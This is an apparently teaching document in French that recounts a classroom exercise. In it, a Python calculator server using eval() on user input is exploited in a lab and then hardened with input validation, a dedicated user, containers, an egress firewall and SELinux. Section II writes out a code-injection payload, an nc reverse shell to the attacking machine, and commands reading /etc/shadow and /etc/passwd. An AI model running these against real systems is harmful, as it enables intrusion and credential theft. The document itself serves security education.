# Remédiations Calculatrice

Dans tout le doc, j'utilise les termes :

- **pour vous** :
  - "dévs" pour la partie dév de la promo
  - "sécu" pour la partie sécu
  - "admins" pour ceux qui ont choisi système/réseau (j'aime pas "infra" dans ce contexte)
- **pour le code** :
  - [`server.py`](./server.py) est la feuille de code qui permet de lancer le serveur calculatrice
  - [`client.py`](./client.py) est la feuille de code qui permet de lancer un client calculatrice qui se co au serveur
- **pour les adresses IP** :
  - `10.1.1.100` : le serveur qui héberge la calculatrice
  - `10.1.1.17` : l'IP de la machine qui attaque

---

**Le I.** est une lecture rapide : quelques mots sur le contexte de l'exo.

**Le II.** est plutôt long et vous explique la démarche du hacker du début à la fin.

**Le III.** est long et constitue une compilation des remédiations proposées par les sécu et certaines par moi (il y a une section dév et une section sys/réseau).

**Le IV.** est une lecture rapide : un récap des remédiations, dans des grandes lignes, un peu les conseils à garder de l'exercice pour chacun d'entre vous.

## Sommaire

- [Remédiations Calculatrice](#remédiations-calculatrice)
  - [Sommaire](#sommaire)
- [I. Contexte complet de l'exercice](#i-contexte-complet-de-lexercice)
- [II. Démarche des sécu](#ii-démarche-des-sécu)
  - [1. Découverte client](#1-découverte-client)
  - [2. Contact avec un serveur](#2-contact-avec-un-serveur)
  - [3. POC](#3-poc)
  - [4. Exploit](#4-exploit)
  - [5. Post-exploit](#5-post-exploit)
  - [6. Bilan final](#6-bilan-final)
- [III. Remédiations](#iii-remédiations)
  - [1. Dév](#1-dév)
    - [A. Client](#a-client)
      - [a. NTUI](#a-ntui)
      - [b. Compilation](#b-compilation)
    - [B. Serveur](#b-serveur)
      - [a. NTUI](#a-ntui-1)
      - [b. Encodage maison](#b-encodage-maison)
  - [2. Système et réseau](#2-système-et-réseau)
    - [A. Client](#a-client-1)
    - [B. Serveur](#b-serveur-1)
      - [a. Le user](#a-le-user)
      - [b. Conteneur](#b-conteneur)
      - [c. Firewall](#c-firewall)
      - [d. SELinux](#d-selinux)
- [IV. Le fin mot de l'histoire](#iv-le-fin-mot-de-lhistoire)
  - [1. Dévs](#1-dévs)
  - [2. Admins](#2-admins)
  - [3. Sécu](#3-sécu)

# I. Contexte complet de l'exercice

Ce que j'avais imaginé et qu'on a réussi à mener à peu près dans des bonnes conditions :

- **les dévs développent une app vulnérable**
  - un vilain `eval()`
  - et l'argument de `eval()` c'est une entrée utilisateur
- **les admins l'hébergent au sein du réseau de l'école**
  - je leur donne
    - `server.py` à héberger
    - `client.py` pour tester que ça marche bien
    - c'est les admins : ils ont tout, les dévs leur font confiance à priori
  - dans une VM, et on se démerde pour que la VM soit joignable sur le réseau
  - (interface bridge ou forwardind NAT avec VBox, pour ceux que ça intéresse)
  - autour de cette app, ils ont fait du monitoring, du packaging étou
- **les sécu pètent l'app**
  - comme dans une situation réelle, je leur donne que `client.py`
  - à la fin, ils deviennent `root` sur la machine qui héberge

# II. Démarche des sécu

Je vous fais la démarche idéale pour péter l'application. Dans les faits, tu passes beaucoup de temps à faire des trucs qui mènent à rien.

La démarche décrite en dessous c'est ce que tu présentes à la fin, mais c'est 5% de ton travail souvent.

**La découverte d'une information crucial, une information clé, sera indiquée par l'emoji 🔑**

## 1. Découverte client

Tiens un `client.py`. Comme son nom l'indique ça doit être un client.

Ca a l'air d'être du Python, j'suis un sécu, j'suis parano, j'vais lire le code avant de l'exécuter.

🔑 **On dirait un client réseau TCP assez simple**

Il parle à un serveur dont l'IP et le port sont précisés en dur dans le code.

L'IP est une IP privée, donc bon ça doit pas marcher si on le lance comme ça le client, cette IP privée ça devait être une VM ou un conteneur qu'utilisait le dév pour faire ses machins.

En revanche le port, c'est `13337/tcp` et ça doit être le port qui est utilisé pour se connecter à ce genre de serveurs.

🔑 **On apprend le port sur lequel écoute le serveur.**

> *On peut aussi lancer le `client.py` à l'aveugle, avec Wireshark d'ouvert en même temps, et voir qu'il essaie de se co à IP:port si on a la flemme de lire le code. Si on fait ça, on exécute le code dans une VM bien sûr, certainement pas sur notre PC en direct. Disons que là c'est Python c'est pas compilé, alors t'as le code. Mais si c'est compilé...*

➜ *Dans le TP des sécu, j'indique clairement que l'app est hébergée en ce moment-même (pendant qu'ils font leur TP) au sein du réseau de l'école.*

Si l'app est hébergée au sein du réseau de l'école, on va vite le savoir, viens là copain `nmap`.

On va demander à `nmap` de tester une connexion sur le port `13337/tcp` de toutes les machines du réseau.

🔑 **Avec un scan réseau `nmap` on apprend les adresses IP des serveurs qui font tourner l'app.**

Dans la suite de ce doc, on suppose que l'IP trouvée est `10.1.1.100`.

Bon bah y'a plus qu'à test.

## 2. Contact avec un serveur

On modifie `client.py` pour qu'il se connecte à une des adresses IP découvertes avec le scan.

On saisit une opération arithmétique, le serveur nous renvoie le résultat.

🔑 **On apprend définitivement la fonction du serveur : un serveur calculatrice donc.**

Le client fait un contrôle sur la saisie de l'utilisateur pour vérifier que c'est une opération arithmétique.

Le contrôle de saisie est plutôt correct, mais il est chiant pour nous hackers, donc on l'enlève de la feuille de code.

En fait, on va même pas utiliser le client tellement c'est une connexion TCP simpliste, utilisons directement `nc` comme client !

```bash
> nc 10.1.1.100 13337
2+2
4
>
```

🔑 **`nc` works !**

Cool, on s'embête plus avec `client.py`, on le contourne, on le *bypass*, on en a tiré tout ce qu'il y avait à savoir.

Avec un peu de chance, y'a moins ou pas de contrôle du tout sur le serveur sur ce qu'on lui envoie.

Parce que de toute façon, comment il fait le serveur pour exécuter cette opération arithmétique ?

Ca sent le `eval()` ça... si c'est le cas on peut lui filer du code arbitraire Python.

Et s'il y a pas trop de contrôle, ça devrait passer ?

## 3. POC

> *POC* c'est pour *Proof of Concept*. Tu prouves que ton truc marche. On pourrait en faire plein de trucs, mais là, déjà, juste ça marche et ça prouve qu'on pourrait faire plus.

Essayons d'envoyer du code python plutôt qu'une opération arithmétique.

On va pas faire dans la dentelle hein, si on peut faire exécuter du Python au serveur, on va lui demander de faire un truc qui nous prouvera à coup sûr que ça fonctionne : qu'il a exécuté du code Python qu'on lui a envoyé.

Par exemple... on va essayer de faire exécuter au serveur un bout de code qui `ping` ma machine. Je lance wireshark, j'injecte mon code, et si ça fonctionne, je devrais recevoir des `ping`. Nan ?

```bash
> nc 10.1.1.100 13337
__import__("os").system("ping -c 4 10.1.1.17")
```

Avec Wireshark, on reçoit bien les 4 pings !

🔑 **Okè héhé, on a de l'injection de code.**

## 4. Exploit

Une fois qu'on a de l'injection, on sait qu'une belle route se dessine devant nous.

Bon déjà, c'est chiant de devoir faire une connexion `nc` pour taper chaque commande. Puis comment je fais pour avoir le retour des commandes ? La merde.

S'il y a injection, y'a fort à parier qu'on peut exécuter un *reverse shell* et ainsi avoir (presque) un vrai shell sur la machine plutôt que lancer `nc` pour exécuter une commande, et ne pas avoir le résultat.

Let's go, essayons d'injecter un reverse shell :

- **étape 1** : lancer un ptit `nc` en écoute sur une machine qu'on contrôle

```bash
# sur la machine de l'attaquant
$ nc -lvp 9999
```

- **étape 2** : injecter le reverse shell sur le serveur

```bash
# on se co au serveur avec nc et on injecte le reverse shell
# l'idée : on lance un shell (bash) et on "accroche" l'entrée et la sortie à une session TCP
# concrètement : le serveur se co à l'attaquant et lui propose un shell
> nc 10.1.1.100 13337
__import__("os").system("nc -e /bin/bash 10.1.1.17 9999")
```

- **étape 3** : retourner sur le `nc` en listen

```bash
# sur la machine de l'attaquant
$ nc -lvp 9999

# on a un shell sur le serveur ici
whoami
root
```

🔑 **Ok j'ai un shell sur la machine qui héberge l'app**

## 5. Post-exploit

Maintenant qu'on a un shell, baladons-nous...

```bash
whoami
root
# mouahaha intéressant, on est root

# bon bah déjà, on commence par voler...
## la liste des users et leurs infos
cat /etc/passwd
[...]

## les hashes des passwords des users
cat /etc/shadow
[...]

# et on se balade un peu
cat /etc/os-release
ps -ef
df -h
ls /
systemctl list-services --all
...

# on aimerait bien trouver le code du serveur
# plein de façons d'y arriver... en bourrin, en supposant que c'est du Python aussi
find / -name *.py
[...]
/opt/calculatrice/server.py

# on vole aussi le code du serveur
cat /opt/calculatrice/server.py
```

🔑 **Confirmation de la présence d'un `eval()` sans contrôle dans le code `server.py`**

## 6. Bilan final

1. Le serveur était vulnérable car le code comporte un `eval()` qui est notoirement dangereux.

2. De plus, à cet `eval()` est directement passée une entrée utilisateur, avec un contrôle faible côté client, et aucun côté serveur.

3. Une fois le code injecté, on se rend compte que l'application est complètement libre sur le système qui l'héberge, et tourne en `root`.

4. La machine n'a pas l'air de présenter de sécurité particulière, buffet à volonté.

# III. Remédiations

## 1. Dév

> *Ces recommandations s'addressent particulièrement aux dévs de la promo : ceux qui ont développé l'app.*

❓ La question c'est : **comment éviter qu'un utilisateur malveillant injecte du code dans notre application ?**

### A. Client

#### a. NTUI

*Never Trust User Input* : ne faites jamais confiance aux entrées utilisateurs.

Dès que tu permets à ton user de t'envoyer des données (un champ texte, un upload de fichiers, des requêtes HTTP, etc.), pars du principe que tes users **vont** t'envoyer de la merde.

Demande-toi ce qu'il se passe si le user saisit du code plutôt qu'une jolie expression arithmétique (ou un beau fichier PNG tout à fait normal).

T'as pas besoin de connaître 1000 techniques de hack. Pars juste du principe que les hackers sont malins, et qu'ils vont t'envoyer de la merde.

Remédiation : côté client on contrôle **très fortement** tout ce qu'envoie le client

Le hacker peut toujours contourner, mais c'est relou. Disons que c'est un petit plus.

#### b. Compilation

> *Proposée et mise en oeuvre en particulier par Mathéo et Samy. DM moi si je crédite les mauvais gens.*

Il est possible de (pré)compiler à peu près n'importe quel code dans n'importe quel langage.

Ca empêchera pas forcément l'injection de code ici, mais rendra plus difficile la tâche du hacker en rendant la lecture du code indirecte et donc difficile.

Même avec Python, on peut packager l'application dans un `.exe` et c'parti, ça se fait souvent avec `Pyinstaller`.

### B. Serveur

#### a. NTUI

*Never Trust User Input* : ne faites jamais confiance aux entrées utilisateurs.

Remédiation: côté serveur on contrôle **très fortement** tout ce qu'envoie le client

On `eval()` rien si on est pas **sûrs** que c'est bien une opération arithmétique ici, et pas du code Python arbitraire par exemple.

☝ **Remédiation** : `eval()` est **très** dangereux, évitez-le à tout prix

Il existe d'autres fonctions que `eval()`, plus complexes, ou d'autres façons de faire (certains sécu ont recodé l'addition par exemple, mais bon le code devient **très** difficile à faire évoluer).

M'enfin, contrôlez de façon forte les entrées utilisateur pour être strictement conforme à ce que vous attendez, et ce sera ok-tiers.

#### b. Encodage maison

> *Ca c'est recommandé par moi héhé.*

Si tu fais **un encodage maison**, plutôt qu'envoyer des strings du client au serveur, ça rend le truc 10x plus opti mais aussi 10x plus secure...

➜ **Déjà, impossible pour le hacker de se passer de ton client.**

Sauf s'il a vraiment la dalle, et qu'il recode toute ta mécanique d'encodage/décodage maison.

Mais sinon, il est obligé d'utiliser ton client. Si en plus de l'encodage, ton client implémente des sécurités, c'est relou pour lui. C'est ce qui le motivera à recoder ta mécanique d'encodage/décodage lui-même... mais ça ralentit beaucoup. Ne jamais sous-estimer la flemme potentielle des êtres humains, en particulier des hackers.

➜ **Ensuite, côté serveur, plutôt que de `eval()` une string yolo reçue sur le réseau**

Si à la place tu reçois octet par octet, en vérifiant la taille de chaque nombre, et en vérifiant à chaque nombre reçu que c'est bien un nombre après l'avoir décodé...

C'est super, super, SUPER strong comme contrôle. Tu vérifies *au bit près* que ce qu'on t'envoie est correct.

☝ **Remédiation** : utiliser un encodage maison entre client et le serveur

- **Conséquence** :
  - le hacker ne peut plus contourner l'utilisation du client natif
    - s'il le fait c'est au prix de recoder beaucoup de choses lui-même
  - le contrôle de données reçues par le serveur est naturellement très fort
- **Par exemple, dans notre cas** :
  - on peut pas utiliser `nc` directement pour bypass l'utilisation de `client.py`
  - obligés d'utiliser `client.py` ou recoder la logique d'encodage/décodage que vous avez inventé
  - si le serveur vérifie au bit près que ce qui est reçu est valable, AVANT d'éventuellement `eval()` on est assez safe des injections par là (jamais safe à 100%)

## 2. Système et réseau

> *Ces recommandations s'addressent particulièrement aux système/réseau de la promo : ceux qui ont hébergé l'app.*

❓ La question c'est : **comment *héberger une application vulnérable*, avec le moins de *risque* possible ?**

Comment héberger une app en ayant la plus petite ***surface d'attaque*** possible ?

### A. Client

Dans le contexte du TP, les admins sys/réseau ne géraient pas les postes des utilisateurs, des clients.

Est-ce que c'est un gars de la promo qui a acheté des PCs pour tout le monde ? Et préinstaller des OS et des outils ?

Nan, pas du tout, on ne gère pas du tout la machine des clients.

**Donc aucune recommandation de la part des sys/réseau pour le client.**

### B. Serveur

#### a. Le user

➜ Si vous suiviez juste mon TP5 les admins, dans le fichier de service `calculatrice.service`, vous ne précisiez aucun utilisateur.

**Par défaut c'est donc `root` qui est utilisé.**

➜ Chaque service **doit** être exécuté sous l'identité d'un utilisateur dédié, créé exprès pour ça.

Ainsi, si le service se met à faire des trucs chelous (bug, hack, autres), il ne pourra faire des trucs chelous que en tant que ce user. Et pas `root`.

On dit que vous réduisez la surface d'attaque de la machine.

> *Je dis "service" ici car vous êtes habitués à **packager** une application dans un **service** (Linux + systemd) pour la run ensuite comme un service système. C'est bien, c'est propre. C'est pas toujours le cas. Quoiqu'il arrive, quand tu lances un machin (service ou autres) il faut qu'il s'exécute sous l'identité d'un utilisateur dédié, qui a des droits restreints sur la machine.*

☝ **Remédiation** : créer un user dédié, et exécuter `server.py` sous l'identité de ce user

- **Conséquence** :
  - le hacker quand il fait son injection, il est pas `root`
  - mais un user qui n'a que très peu de droits
- **Par exemple, dans notre cas** : 
  - il peut toujours voler `server.py` et `/etc/passwd`
  - mais plus `/etc/shadow`

On passe donc d'un service comme ça :

```bash
$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super calculatrice réseau

[Service]
ExecStart=/bin/python /opt/calculatrice/server.py

[Install]
WantedBy=multi-user.target
```

A au moins ça :

```bash
$ sudo useradd calculatrice

$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super calculatrice réseau

[Service]
User=calculatrice
ExecStart=/bin/python /opt/calculatrice/server.py

[Install]
WantedBy=multi-user.target
```

> *Il est même possible de configurer le user `calculatrice` avec encore moins de droits (pas de password, pas de homedir, aucun fichier qui lui appartient à part le `server.py` etc.)*

#### b. Conteneur

> *Proposée et mise en oeuvre en particulier par Geoffrey et Doniban. DM moi si je crédite les mauvais gens.*

Je vais être bref car je vais vous donner des cours plus tard sur cette notion.

➜ **Plutôt que de lancer l'application avec un *service*, il est possible de lancer l'application dans un *conteneur*.**

Voyez le conteneur comme une alternative au *service* (c'est pas une analogie bidon, c'est très juste et très proche en réalité).

Si on lance l'application dans un conteneur, elle sera **isolée** du reste de votre système.

> *Rien à voir avec une VM. Pitié. Un service on a dit.*

Par exemple, impossible pour l'application d'accéder aux fichiers qui se trouvent sur la machine : elle n'y a juste pas accès.

Impossible pour elle aussi d'utiliser les cartes réseau du serveur : un conteneur a ses propres cartes réseau.

> *Un conteneur c'est une *sandbox* pour ceux à qui ça parle ce terme, sinon balec, ignore ce commentaire.*

☝ **Remédiation** : exécuter `server.py` dans un conteneur Docker plutôt qu'un service

- **Conséquence** :
  - quand le hacker fait son injection, il n'a pas accès aux ressources de l'hôte
  - pas accès à ses fichiers, ni ses cartes réseau, ni ses users, etc
- **Par exemple, dans notre cas** :
  - il peut toujours voler `server.py` 
  - mais plus `/etc/passwd` ni `/etc/shadow`.

Pour ça, on crée un fichier `Dockerfile` :

```Dockerfile
FROM python

COPY server.py /opt/server.py

ENTRYPOINT ["python", "/opt/server.py"]
```

On peut alors transformer ce fichier en une image Docker :

```bash
$ docker build . -t calculatrice
```

Et ensuite run l'application :

```bash
$ docker run -p 13337:13337 calculatrice
```

> *J'suis allé droit au but, y'a plein de façons de faire mieux. La suite au prochain épisode pendant le cours sur Docker.*

#### c. Firewall

Un firewall ça bloque ou laisse passer des connexions qui entrent sur la machine, mais aussi celles qui sortent de la machine.

**Il est récurrent dans la confif du firewall, pour le contrôle du trafic en sortie** :

➜ **pour des PCs clients (nos PCs à nous) de laisser open-bar en sortie**

- le firewall ne bloque rien en sortie
- sinon tu pourrais pas aller sur youtube, ou sur rien d'autre en fait
- tu pourrais pas envoyer de paquets sur le réseau

➜ **pour des serveurs, généralement, on bloque tout**

- à quel moment un serveur fait une connexion sortante
- pour aller sur youtube ?
- bah jamais à priori (ou presque)
- ou alors un hacker exfiltre des données ou mine du bitcoin ouais

☝ **Remédiation** : le firewall de la machine qui héberge `server.py` doit être très restrictif en sortie.

- **Conséquence** :
  - le hacker, quand il fait son injection, il ne peut pas faire de connexions vers l'extérieur
- **Par exemple, dans notre cas** :
  - impossible de tester avec `ping` que l'injection fonctionne
  - impossible de créer un reverse shell

> *Ca empêche pas l'attaque mais putain qu'elle devient reloue à mener...*

#### d. SELinux

SELinux est un outil permettant d'augmenter le niveau de sécurité d'une machine Linux. Installé par défaut sur tous les systèmes RedHat (Rocky, Fedora, RHEL, etc.).

Souvent on le désactive, je vous l'ai même fait désactiver dans votre patron de VM, comme ça il est toujours désactivé quand vous clonez.

Mais si on le configure, la sécu apportée est folle.

Dans notre cas, SELinux empêcherait le hacker de :

- **plus possible d'injecter des commandes shell**
  - genre l'injection est là
  - mais ce programme Python on lui enlève les droits de lancer d'autres programmes
  - donc impossible de lui faire lancer des commandes shell
  - MAIS on pourrait toujours voler le code étou directement en injectant que du Python
  - des ptits `open()` pour lire les fichiers par exemple
- **impossible d'accéder à d'autres fichiers sur le système**
  - `server.py` il ne peut ouvrir aucun autre fichier
  - c'est tout
  - chut c'est tout, t'ouvres rien
  - même si c'est `root` qui exécute `server.py` : chut t'as pas le droit
- **impossible de faire quoique ce soit en fait**
  - pas d'interaction avec le réseau
  - pas d'interaction avec les fichiers
  - impossible de lancer de nouveaux process

☝ **Remédiation** : activer et configurer SELinux

- **Conséquence** :
  - même si l'injection est présente, le hacker reste confiné au code Python de l'application
- **Par exemple, dans notre cas** :
  - l'injection marche toujours hein, l'app est vulnérable toute façon
  - mais l'injection ne mène plus à injecter du code sur l'hôte
  - on peut juste taper du Python. Sûrement apprendre quelques trucs sur le code du serveur (et c'est déjà pas cool), mais c'est très limité

# IV. Le fin mot de l'histoire

## 1. Dévs

➜ **NTUI**

- *Never Trust User Input*
- genre never, tes users, y'a des hackers dedans
- la plupart bienveillants, mais pas tous
- **contrôlez de manière forte toutes les saisies utilisateur**

➜ **`eval()` est extrêmement dangereux et c'est notoire**

- cette fonction existe dans tous les langages ou presque
- elle est notoirement réputée pour être dangereuse
- si on lui passe une saisie utilisateur c'est RED FLAG direct
- **évitez `eval()` autant que possible**

➜ **brouillez les pistes**

- compilation du client, encodage maison, obfuscation du code, etc
- misez sur la flemme du hacker
- cela dit, si le gars est détér ça sert à rien (sauf l'encodage, parce qu'on a la perf avec aussi)

> *Si votre code est open-source, bah tout le monde y a accès. Mais tkt, le principe, c'est que 99% des hackers sont avec toi, et juste 1% est contre. Donc ton code open-source va être renforcé par le 99%.*

## 2. Admins

➜ **jamais utiliser `root` pour faire tourner un service**

- utiliser un user dédié
- il doit avoir le moins de droits possible

➜ **essayez de confiner les applications qui tournent**

- conteneur, SELinux, autres
- on confine l'app dans un environnement isolé
- on l'empêche d'accéder aux ressources de l'hôte (fichiers, réseau, users, etc.)

➜ **le firewall, pitié**

- le firewall c'est ton premier rempart pour ce qui est du réseau
- **il est tellement efficace**, en ajoutant juste quelques lignes de conf...
- ne le négligez pas, jamais, toutes les machines ont un firewall, il **FAUT** le conf
- y'a pas d'exceptions, jamais. Tu conf le firewall c'tout.
- **de la manière la plus restrictive possible** : par exemple ici, pas de trafic sortant pour un serveur

## 3. Sécu

🌼 **Vous aurez le droit de faire les malins si vous pliez tous les TPs dév et sys/réseau avant de parler.** 🌼
